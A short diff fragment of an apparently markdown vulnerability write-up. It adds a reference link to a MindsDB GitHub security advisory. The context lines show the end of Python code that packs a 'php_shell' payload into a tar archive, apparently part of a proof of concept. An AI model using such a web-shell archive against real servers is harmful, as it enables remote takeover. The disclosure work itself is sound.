@@ -1215,8 +1215,13 @@ info.size=len(php_shell)
 tar.addfile(info,io.BytesIO(php_shell))
 tar.close()
 ```
-
 ----------------
+
+### REFERENCE-:
+
+- [Mindsdb](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx)
+
+---------------
 
 
 
